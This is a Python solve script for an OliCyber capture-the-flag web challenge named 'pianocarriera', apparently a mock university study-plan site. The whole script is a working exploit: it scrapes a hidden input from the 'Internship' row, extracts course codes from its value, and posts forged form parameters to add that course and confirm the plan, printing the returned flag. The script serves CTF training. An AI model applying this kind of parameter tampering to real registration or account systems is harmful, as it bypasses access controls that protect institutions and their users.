#!/usr/bin/env python3
from bs4 import BeautifulSoup
import requests
URL = "http://pianocarriera.challs.olicyber.it/piacar/"
HTML = requests.get(URL[:URL.index("piacar")]).text
FINDER = BeautifulSoup(HTML, "html.parser")

# Get the data of the internship
lists = FINDER.find_all("tr", class_="giallo")
for i in lists:
    if str(i).find("Internship") != -1:
        lists = i
        break
tag = lists.find_all("input", class_="noProp")[0]
index = str(tag).find("value=\"") + len("value=\"")
cod_ins = str(tag)[index:index+7]
index += 7 + 1 # '_' character
cod_ins_padre = str(tag)[index:index+7]
index += 7 + 1 # '-' character
id_padre = str(tag)[index:index+6]

s = requests.Session()
s.post(URL + "do_piaca.do", data = {"event":"aggiungiEsameScelta", "cod_ins":cod_ins, "id_padre":id_padre, "cod_ins_padre":cod_ins_padre})
flag = s.post(URL + "home_pianocarriera.do", data = {"event":"conferma"})
print(flag.text)
